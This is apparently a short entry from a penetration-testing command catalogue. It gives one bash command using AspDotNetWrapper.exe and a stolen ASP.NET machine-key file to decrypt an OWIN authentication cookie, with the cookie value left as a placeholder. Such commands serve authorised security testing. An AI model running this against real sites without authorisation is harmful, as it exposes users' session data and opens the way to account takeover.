---
id: 26f0eb08-50d1-4651-8059-4b469870141c
name: Decrypt cookie using AspDotNetWrapper.exe
type: command
executor: bash
data: $ AspDotNetWrapper.exe --keypath C:\MachineKey.txt --cookie XXXXXXX_XXXXX-XXXXX
  --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes
output: null
created_at: '2023-04-06T03:55:53.437641+00:00'
updated_at: '2023-04-06T03:55:53.449842+00:00'
---

# Decrypt cookie using AspDotNetWrapper.exe

```bash
$ AspDotNetWrapper.exe --keypath C:\MachineKey.txt --cookie XXXXXXX_XXXXX-XXXXX --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes
```


